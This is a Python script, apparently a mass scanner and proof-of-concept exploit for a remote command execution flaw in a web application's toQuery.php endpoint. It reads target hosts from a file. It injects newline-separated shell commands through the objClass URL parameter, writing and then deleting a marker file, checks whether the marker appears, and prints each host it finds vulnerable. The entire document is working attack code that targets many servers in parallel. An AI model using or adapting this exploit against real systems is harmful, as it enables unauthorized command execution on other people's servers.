import requests
import urllib3
from multiprocessing import Pool

urllib3.disable_warnings()

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/88.0.4324.192 Mobile Safari/537.36 "
}

# proxy setting
proxy = "127.0.0.1:7890"
proxies = {
    'http': 'http://' + proxy,
    'https': 'http://' + proxy
}


def rm_txt(url):
    url = url + "/view/Behavior/toQuery.php?method=getList&objClass=%0arm%201.txt%0a"
    try:
        requests.get(url=url, headers=headers, verify=False, timeout=10, proxies=proxies)
    except:
        return


def detection_url(url):
    detection_url = url + "/view/Behavior/1.txt"
    r = requests.get(url=detection_url, headers=headers, verify=False, timeout=10, proxies=proxies)
    if r.text.replace("\n", "") == "hacker":
        rm_txt(url)
        return 1
    rm_txt(url)
    return 0


def target_url(url):
    target_url = url + "/view/Behavior/toQuery.php?method=getList&objClass=%0aecho%20\"hacker\"%20>%201.txt%0a"
    try:
        requests.get(url=target_url, headers=headers, verify=False, timeout=10, proxies=proxies)
        if detection_url(url) == 1:
            print(f"\033[31m[!]  目标: {target_url} 存在RCE漏洞！\033[0m")
    except Exception as e:
        print(f"[0]  目标: {url} 存在未知错误！")


if __name__ == "__main__":
    pool = Pool(processes=10)
    with open("ip.txt", "r") as f:
        for url in f:
            if url[:4] != "http":
                url = "http://" + url
            url = url.strip()
            pool.apply_async(target_url, args=(url,))
    f.close()
    pool.close()
    pool.join()
